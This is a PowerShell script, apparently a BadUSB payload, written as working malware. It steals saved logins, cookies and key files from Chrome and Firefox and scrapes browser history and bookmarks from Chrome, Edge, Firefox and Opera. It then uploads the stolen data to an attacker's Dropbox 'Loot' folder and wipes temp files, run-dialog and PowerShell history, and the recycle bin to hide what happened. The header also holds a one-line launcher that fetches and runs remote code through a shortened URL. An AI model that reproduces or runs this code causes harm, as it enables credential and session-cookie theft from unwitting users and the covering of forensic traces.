#   @@@@@@@   @@@@@@    @@@@@@   @@@  @@@  @@@  @@@@@@@@     @@@@@@@@@@    @@@@@@   @@@  @@@   @@@@@@   @@@@@@@  @@@@@@@@  @@@@@@@   
#  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@  @@@  @@@@@@@@     @@@@@@@@@@@  @@@@@@@@  @@@@ @@@  @@@@@@@   @@@@@@@  @@@@@@@@  @@@@@@@@  
#  !@@       @@!  @@@  @@!  @@@  @@!  !@@  @@!  @@!          @@! @@! @@!  @@!  @@@  @@!@!@@@  !@@         @@!    @@!       @@!  @@@  
#  !@!       !@!  @!@  !@!  @!@  !@!  @!!  !@!  !@!          !@! !@! !@!  !@!  @!@  !@!!@!@!  !@!         !@!    !@!       !@!  @!@  
#  !@!       @!@  !@!  @!@  !@!  @!@@!@!   !!@  @!!!:!       @!! !!@ @!@  @!@  !@!  @!@ !!@!  !!@@!!      @!!    @!!!:!    @!@!!@!   
#  !!!       !@!  !!!  !@!  !!!  !!@!!!    !!!  !!!!!:       !@!   ! !@!  !@!  !!!  !@!  !!!   !!@!!!     !!!    !!!!!:    !!@!@!    
#  :!!       !!:  !!!  !!:  !!!  !!: :!!   !!:  !!:          !!:     !!:  !!:  !!!  !!:  !!!       !:!    !!:    !!:       !!: :!!   
#  :!:       :!:  !:!  :!:  !:!  :!:  !:!  :!:  :!:          :!:     :!:  :!:  !:!  :!:  !:!      !:!     :!:    :!:       :!:  !:!  
#   ::: :::  ::::: ::  ::::: ::   ::  :::   ::   :: ::::     :::     ::   ::::: ::   ::   ::  :::: ::      ::     :: ::::  ::   :::  
#    :: :: :   : :  :    : :  :    :   :::  :    : :: ::       :      :     : :  :   ::    :   :: : :       :     : :: ::    :   : :  
#                                                                                                                                  
# This script will grab Firefox and Chrome Saved Logins and Cookies along with Browser Data for 
# Chrome, Edge, Firefox, and Opera then upload those to DropBox in a new folder called Loot followed
# by a Folder named after the username the data came from
#
# The extraction of Browser History and Bookmarks was copied from I-Am-Jakoby's browserData.ps1 script 
# https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/blob/main/Payloads/Flip-BrowserData/browserData.ps1
#
# Created By: 0D1NSS0N
# Target: Windows 10/11
# Version: 2.0
# How-To: update $db = 'INSERT-YOUR-DROPBOX-TOKEN' then run the payload in powershell
# payload: $db = 'INSERT-YOUR-DROPBOX-TOKEN';irm tinyurl.com/3tm7msr7 | iex
# 
#------------------------------------------------------------------------------------------------------------------------------------
#
# Google Chrome - copy Login Data, Cookies, and Local State files and add them to a new folder called Google-UserData
# then zip that folder to be ready to send to dropbox

#------------------------------------------------------------------------------------------------------------------------------------

# Terminate Google Chrome Process
try {
    Write-Host "Terminating Google Chrome process..."
    Stop-Process -Name "chrome" -Force
    Write-Host "Google Chrome process terminated successfully."
}
catch {
    Write-Host "Error occurred while terminating Google Chrome process: $_" -ForegroundColor Red
}
#------------------------------------------------------------------------------------------------------------------------------------

$GLoginPath = "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Login Data"
$GcookiesPath = "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
$GLocalStatePath = "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Local State"
$GoogleFolderPath = "$env:tmp\Google-UserData\"
$GfilePath = "$env:temp\Google-UserData.zip"
$GdestinationPath = "/Loot/$env:USERNAME/Google-UserData.zip"

mkdir $env:tmp\Google-UserData

Copy-Item -Path $GcookiesPath -Destination $GoogleFolderPath -Force
Copy-Item -Path $GLoginPath -Destination $GoogleFolderPath -Force
Copy-Item -Path $GLocalStatePath -Destination $GoogleFolderPath -Force
Compress-Archive -Path $GoogleFolderPath -DestinationPath $GfilePath

#------------------------------------------------------------------------------------------------------------------------------------
#
# This section will search for firefox cookies and saved logins and place them in a folder in the tmp directory 
# then zip the file to be sent to dropbox
#

$SearchPath = "C:\Users\$env:UserName\AppData\Roaming\Mozilla\Firefox\Profiles"
$FilesToSearch = @("cookies.sqlite", "cookies.sqlite-shm", "cookies.sqlite-wal", "logins.json", "logins-backup.json", "key4.db")
$TempFolderPath = "$env:tmp\Firefox-UserData\"
$FfilePath = "$env:tmp\Firefox-UserData.zip"
$FdestinationPath = "/Loot/$env:USERNAME/Firefox-UserData.zip"


mkdir $env:tmp\Firefox-UserData

$Results = @()

$FilesToSearch | ForEach-Object {
    $SearchPattern = $_
    $Files = Get-ChildItem -Path $SearchPath -Recurse -Filter $SearchPattern -ErrorAction SilentlyContinue
    if ($Files) {
        $Results += $Files
    }
}

if ($Results) {
    Write-Host "Found the following files:"
    $Results | Select-Object FullName

    $Results | ForEach-Object {
        $DestinationPath = Join-Path -Path $TempFolderPath -ChildPath $_.Name
        Copy-Item -Path $_.FullName -Destination $DestinationPath -Force
    }

    Write-Host "Files copied to $TempFolderPath"
} else {
    Write-Host "No files found."
}

Compress-Archive -Path "$env:tmp\Firefox-UserData" -DestinationPath "$env:tmp\Firefox-UserData.zip"

#---------------------------------------------------------------------------------------------------------------------------------------
#
# This section will grab browser history and bookmarks from Chrome, Edge, Firefox, and Opera and save those in a file call --BrowserData.txt 
# in the temp directory
#

$BfilePath = "$env:tmp\--BrowserData.txt"
$BdestinationPath = "/Loot/$env:USERNAME/--BrowserData.txt"

function Get-BrowserData {

    [CmdletBinding()]
    param (	
    [Parameter (Position=1,Mandatory = $True)]
    [string]$Browser,    
    [Parameter (Position=1,Mandatory = $True)]
    [string]$DataType 
    ) 

    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

    if     ($Browser -eq 'chrome'  -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"}
    elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"}
    elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"}
    elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks"}
    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"}
    elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"}
    elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"}

    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
    $Value | ForEach-Object {
        $Key = $_
        if ($Key -match $Search){
            New-Object -TypeName PSObject -Property @{
                User = $env:UserName
                Browser = $Browser
                DataType = $DataType
                Data = $_
            }
        }
    } 
}

Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\--BrowserData.txt

Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt

Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\--BrowserData.txt

Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP--BrowserData.txt

Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\--BrowserData.txt

Get-BrowserData -Browser "opera" -DataType "history" >> $env:TMP\--BrowserData.txt

Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt


#------------------------------------------------------------------------------------------------------------------------------------

#Upload to Dropbox

# Chrome Data

try {
    $headers = @{
        "Authorization" = "Bearer $db"
        "Content-Type" = "application/octet-stream"
        "Dropbox-API-Arg" = '{"path": "' + $GdestinationPath + '", "mode": "add", "autorename": true, "mute": false}'
    }

    $fileContent = [System.IO.File]::ReadAllBytes($GfilePath)
    $url = "https://content.dropboxapi.com/2/files/upload"

    Invoke-RestMethod -Uri $url -Method Post -Headers $headers -InFile $GfilePath -ContentType "application/octet-stream"

    Write-Host "Chrome Cookie Jar uploaded successfully"
}
catch {
    Write-Host "Error occurred while uploading the file: $_" -ForegroundColor Red
}

# Firefox Data

try {
    $headers = @{
        "Authorization" = "Bearer $db"
        "Content-Type" = "application/octet-stream"
        "Dropbox-API-Arg" = '{"path": "' + $FdestinationPath + '", "mode": "add", "autorename": true, "mute": false}'
    }

    $fileContent = [System.IO.File]::ReadAllBytes($FfilePath)
    $url = "https://content.dropboxapi.com/2/files/upload"

    Invoke-RestMethod -Uri $url -Method Post -Headers $headers -InFile $FfilePath -ContentType "application/octet-stream"

    Write-Host "Firefox Cookie Jar uploaded successfully"
}
catch {
    Write-Host "Error occurred while uploading the file: $_" -ForegroundColor Red
}

# Browser History/Bookmarks

try {
    $headers = @{
        "Authorization" = "Bearer $db"
        "Content-Type" = "application/octet-stream"
        "Dropbox-API-Arg" = '{"path": "' + $BdestinationPath + '", "mode": "add", "autorename": true, "mute": false}'
    }

    $fileContent = [System.IO.File]::ReadAllBytes($BfilePath)
    $url = "https://content.dropboxapi.com/2/files/upload"

    Invoke-RestMethod -Uri $url -Method Post -Headers $headers -InFile $BfilePath -ContentType "application/octet-stream"

    Write-Host "Firefox Cookie Jar uploaded successfully"
}
catch {
    Write-Host "Error occurred while uploading the file: $_" -ForegroundColor Red
}

#------------------------------------------------------------------------------------------------------------------------------------
#
# Clean Exfiltration - deletes files in tmp directory, deletes run dialog and powershell history, empties recycling bin
# ^^ Thanks for this I-Am-Jakoby ^^
#
rm $env:tmp\* -r -Force -ErrorAction SilentlyContinue
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
Clear-RecycleBin -Force -ErrorAction SilentlyContinue
